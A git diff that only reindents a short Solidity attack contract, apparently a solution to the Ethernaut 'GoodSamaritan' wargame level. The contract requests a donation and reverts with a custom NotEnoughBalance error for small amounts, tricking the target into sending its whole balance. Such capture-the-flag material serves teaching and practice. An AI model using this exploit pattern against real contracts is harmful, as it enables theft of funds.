@@ -7,19 +7,19 @@ import "../levels/GoodSamaritan.sol";
 error NotEnoughBalance();
 
 contract GoodSamaritanAttack {
-  address private immutable _goodSamaritan;
+    address private immutable _goodSamaritan;
 
-  constructor(address goodSamaritan_) {
-    _goodSamaritan = goodSamaritan_;
-  }
-
-  function attack() external {
-    GoodSamaritan(_goodSamaritan).requestDonation();
-  }
-
-  function notify(uint256 amount_) external pure {
-    if(amount_ <= 10) {
-      revert NotEnoughBalance();
+    constructor(address goodSamaritan_) {
+        _goodSamaritan = goodSamaritan_;
     }
-  }
+
+    function attack() external {
+        GoodSamaritan(_goodSamaritan).requestDonation();
+    }
+
+    function notify(uint256 amount_) external pure {
+        if (amount_ <= 10) {
+            revert NotEnoughBalance();
+        }
+    }
 }
